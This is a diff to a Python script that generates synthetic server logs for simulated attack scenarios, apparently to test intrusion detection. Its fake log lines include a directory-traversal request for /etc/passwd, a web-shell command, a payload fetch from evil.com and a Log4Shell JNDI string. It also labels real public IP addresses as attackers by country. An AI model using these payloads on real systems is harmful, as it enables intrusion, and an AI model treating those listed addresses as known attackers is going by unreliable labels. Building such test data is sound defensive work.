@@ -4,6 +4,24 @@ import time
 import sys
 import os
 
+TRUSTED_IPS = [
+    "8.8.8.8",
+    "8.8.4.4",
+    "1.1.1.1",
+    "1.0.0.1",
+    "9.9.9.9"
+]
+
+# IPs that will ONLY be used for ATTACK scenarios.
+ATTACKER_IPS = [
+    "193.42.109.42",   # Russia
+    "129.215.17.15",   # Germany
+    "103.197.144.1",   # Vietnam
+    "45.33.32.156",    # USA
+    "131.103.24.238",  # Brazil
+    "197.210.64.133"   # Nigeria
+]
+
 # --- Helper Functions (from your original script) ---
 def random_ip():
     return ".".join(str(random.randint(1, 255)) for _ in range(4))
@@ -79,7 +97,7 @@ class LogWriter:
 
 def scenario_1_ssh_brute_force(writer: LogWriter):
     print("\n--- 💣 Running Scenario 1: SSH Brute-Force Attack ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     target_user = random.choice(['root', 'admin', 'ubuntu'])
     for _ in range(random.randint(5, 10)):
         # 
@@ -91,7 +109,7 @@ def scenario_1_ssh_brute_force(writer: LogWriter):
 
 def scenario_2_privilege_escalation(writer: LogWriter):
     print("\n--- 💣 Running Scenario 2: Privilege Escalation ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     user = random_user()
     num = random_number()
     writer.write_log("sshd", f"Accepted password for {user} from {attacker_ip} port {random_port()}")
@@ -102,7 +120,7 @@ def scenario_2_privilege_escalation(writer: LogWriter):
 
 def scenario_3_web_directory_traversal(writer: LogWriter):
     print("\n--- 💣 Running Scenario 3: Web Directory Traversal ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     # 
     writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 404')
     # 
@@ -110,7 +128,7 @@ def scenario_3_web_directory_traversal(writer: LogWriter):
 
 def scenario_4_web_shell_upload(writer: LogWriter):
     print("\n--- 💣 Running Scenario 4: Web Shell Upload & Execution ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "POST /uploads/upload.php HTTP/1.1" 200')
     # 
     writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200')
@@ -140,7 +158,7 @@ def scenario_7_rogue_package_install(writer: LogWriter):
 
 def scenario_8_port_scanning(writer: LogWriter):
     print("\n--- 💣 Running Scenario 8: Port Scanning ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     for port in [21, 22, 80, 443, 3306, 8080, 5432, 25]:
         # 
         writer.write_log("kernel", f"Firewall: *TCP_IN Blocked* IN=eth0 OUT= MAC=... SRC={attacker_ip} DST=... PROTO=TCP SPT={random_port()} DPT={port}")
@@ -151,11 +169,11 @@ def scenario_9_data_exfiltration(writer: LogWriter):
     # 
     writer.write_log("sudo", f"{user} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/tar czf /tmp/backup.tar.gz .")
     writer.write_log("kernel", "Outbound connection to 104.22.60.184:443 established")
-    writer.write_log("systemd", f"User {user} sent 1.5GB of data to {random_ip()}")
+    writer.write_log("systemd", f"User {user} sent 1.5GB of data to {random.choice(ATTACKER_IPS)}")
 
 def scenario_10_living_off_the_land(writer: LogWriter):
     print("\n--- 💣 Running Scenario 10: Living Off The Land ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     writer.write_log("kernel", f"process '/usr/bin/curl' started by user {random_user()}")
     # 
     writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET http://evil.com/payload.sh" 200')
@@ -179,7 +197,7 @@ def scenario_12_rogue_user_creation(writer: LogWriter):
 
 def scenario_13_application_dos(writer: LogWriter):
     print("\n--- 💣 Running Scenario 13: Application-Level DoS ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     for _ in range(30):
         writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /login.php HTTP/1.1" 200')
         time.sleep(0.05) # Very rapid requests
@@ -192,14 +210,14 @@ def scenario_14_xorg_errors(writer: LogWriter):
 
 def scenario_15_invalid_user_probing(writer: LogWriter):
     print("\n--- 💣 Running Scenario 15: Invalid User Probing ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     for user in ['test', 'guest', 'oracle', 'backup', 'deploy', 'user1', 'api', 'dbuser']:
         # 
         writer.write_log("sshd", f"Invalid user {user} from {attacker_ip} port {random_port()}")
 
 def scenario_16_credential_stuffing(writer: LogWriter):
     print("\n--- 💣 Running Scenario 16: Credential Stuffing ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     for user in ['admin', 'jdoe', 'support', 'dev', 'test']:
         # 
         writer.write_log("sshd", f"Failed password for {user} from {attacker_ip} port {random_port()}")
@@ -228,7 +246,7 @@ def scenario_19_process_injection(writer: LogWriter):
 
 def scenario_20_command_and_control_beaconing(writer: LogWriter):
     print("\n--- 💣 Running Scenario 20: C2 Beaconing ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     for _ in range(5):
         writer.write_log("firewall", f"Outbound connection allowed to {attacker_ip}:443 from internal host")
         time.sleep(random.uniform(5, 15)) # Mimics regular beaconing interval
@@ -241,7 +259,7 @@ def scenario_21_masquerading_as_system_process(writer: LogWriter):
 
 def scenario_22_log4shell_exploitation(writer: LogWriter):
     print("\n--- 💣 Running Scenario 22: Log4Shell Exploitation ---")
-    attacker_ip = random_ip()
+    attacker_ip = random.choice(ATTACKER_IPS)
     # 
     writer.write_log("myapp", f"Received request with suspicious User-Agent: ${{jndi:ldap://{attacker_ip}/a}}")
     writer.write_log("kernel", f"process '/bin/java' started child '/bin/bash'")
@@ -277,7 +295,7 @@ def generate_normal_log(writer: LogWriter):
         "pam_unix(sshd:session): session closed for user {user}",
         "pam_unix(sshd:session): session opened for user {user} by (uid={num})",
         "Received disconnect from {ip}: {num}: Bye Bye [preauth]",
-        "Connection closed by {ip} [preauth]",
+        "Connection closed by {t_ip} [preauth]",
         "systemd: Started User Session {pid} of user {user}.",
         "kernel: usb 1-{num}: USB disconnect, device number 2",
         "Received disconnect from {ip}: {num}: Closed due to user request [preauth]",
@@ -285,12 +303,12 @@ def generate_normal_log(writer: LogWriter):
         "config/udev: Adding input device 2.4G Mouse (/dev/input/event{num})",
         "Option-'config_info' 'udev:/sys/devices/pci0000:00/0000:00:{num}.0/usb3/3-4/3-4:1.0/0003:1EA7:00{num}6.0001/input/input{num}/event{num}",
         "GXT7863:00 27C6:01E0 Touchpad: (accel) acceleration factor: 2.000",
-        "Received disconnect from {ip}: {num}: disconnected by user",
-        "Did not receive identification string from {ip}",
+        "Received disconnect from {t_ip}: {num}: disconnected by user",
+        "Did not receive identification string from {t_ip}",
         "Accepted password for {user} from {ip} port {port} ssh{num}",
 
     ])
-    writer.write_log(random.choice(['sshd', 'systemd', 'kernel', 'Xorg.0.log']), tpl.format(user=random_user(), ip=random_ip(), pid=random_pid(), num=random_number(), port=random_port()))
+    writer.write_log(random.choice(['sshd', 'systemd', 'kernel', 'Xorg.0.log']), tpl.format(user=random_user(), ip=random_ip(), t_ip=random.choice(TRUSTED_IPS), pid=random_pid(), num=random_number(), port=random_port()))
 
 def generate_anomaly_log(writer: LogWriter):
     tpl = random.choice([
@@ -321,8 +339,8 @@ def generate_anomaly_log(writer: LogWriter):
         "kernel: panic occurred, switching back to text console"
     ])
     writer.write_log(random.choice(['sshd', 'systemd', 'kernel', 'Xorg.0.log', 'sudo']), 
-tpl.format(user=random_user(), 
-            ip=random_ip(), 
+        tpl.format(user=random_user(), 
+            ip=random.choice(ATTACKER_IPS), 
             pid=random_pid(), 
             num=random_number(), 
             port=random_port(),
